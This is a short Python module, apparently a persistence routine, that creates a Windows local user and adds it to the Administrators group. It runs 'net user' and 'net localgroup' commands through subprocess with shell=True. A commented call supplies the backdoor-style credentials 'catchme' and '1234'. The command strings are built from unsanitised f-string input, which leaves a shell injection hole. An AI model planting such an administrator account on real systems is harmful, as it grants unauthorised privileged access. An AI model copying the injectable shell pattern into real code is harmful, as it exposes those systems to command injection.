# catchme_module.py
import subprocess

def create_user(username, password):
    create_user_command = f"net user {username} {password} /add"
    subprocess.run(create_user_command, shell=True)

    add_to_admin_group_command = f"net localgroup Administrators {username} /add"
    subprocess.run(add_to_admin_group_command, shell=True)

#create_user("catchme", "1234")